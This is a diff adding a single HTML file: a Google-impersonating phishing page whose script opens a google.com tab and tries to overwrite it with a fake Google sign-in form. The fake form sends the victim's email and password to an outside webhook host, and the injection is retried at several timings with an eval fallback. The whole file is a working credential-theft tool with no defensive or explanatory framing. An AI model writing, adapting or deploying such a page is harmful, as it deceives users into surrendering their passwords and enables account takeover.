@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>google.com</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    button {
+      padding: 14px 28px;
+      background: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <h1 style="color:#4285f4">Google</h1>
+    <button onclick="spoofAndInject()">Sign In to Google</button>
+  </div>
+
+  <script>
+    function spoofAndInject() {
+      const targetTab = window.open("https://www.google.com/csi", "_blank");
+      if (!targetTab) {
+        alert("Popup blocked!");
+        return;
+      }
+
+      // Konten yang akan diinject
+      const content = `
+        <html>
+        <head>
+          <title>google.com</title>
+          <style>
+            body {
+              margin: 0;
+              font-family: Arial, sans-serif;
+              display: flex;
+              justify-content: center;
+              align-items: center;
+              min-height: 100vh;
+              background: #f8f9fa;
+            }
+            .card {
+              background: white;
+              padding: 40px;
+              border-radius: 12px;
+              box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+              width: 360px;
+              text-align: center;
+            }
+            h1 { color: #4285f4; font-size: 2rem; }
+            input {
+              width: 100%;
+              padding: 14px;
+              margin: 8px 0;
+              border: 1px solid #dadce0;
+              border-radius: 6px;
+              font-size: 16px;
+              box-sizing: border-box;
+            }
+            button {
+              width: 100%;
+              padding: 14px;
+              background: #4285f4;
+              color: white;
+              border: none;
+              border-radius: 6px;
+              font-size: 16px;
+              cursor: pointer;
+              margin-top: 12px;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="card">
+            <h1>Google</h1>
+            <p style="color:#666">Sign in to continue</p>
+            <form action="https://young-comet-60.webhook.cool" method="POST">
+              <input type="email" name="email" 
+                     placeholder="Email or phone" required>
+              <input type="password" name="password" 
+                     placeholder="Enter your password" required>
+              <button type="submit">Next</button>
+            </form>
+          </div>
+        </body>
+        </html>
+      `;
+
+      // Coba berbagai timing
+      const delays = [300, 500, 800, 1000, 1500];
+      
+      delays.forEach(delay => {
+        setTimeout(() => {
+          try {
+            if (targetTab && !targetTab.closed) {
+              targetTab.document.open();
+              targetTab.document.write(content);
+              targetTab.document.close();
+              console.log('Injected at delay:', delay);
+            }
+          } catch(e) {
+            console.warn('Failed at delay', delay, ':', e.message);
+            
+            // Fallback via eval
+            try {
+              targetTab.eval(`
+                document.open();
+                document.write(\`${content.replace(/`/g, '\\`')}\`);
+                document.close();
+              `);
+            } catch(e2) {
+              console.warn('Eval also failed:', e2.message);
+            }
+          }
+        }, delay);
+      });
+    }
+  </script>
+</body>
+</html>
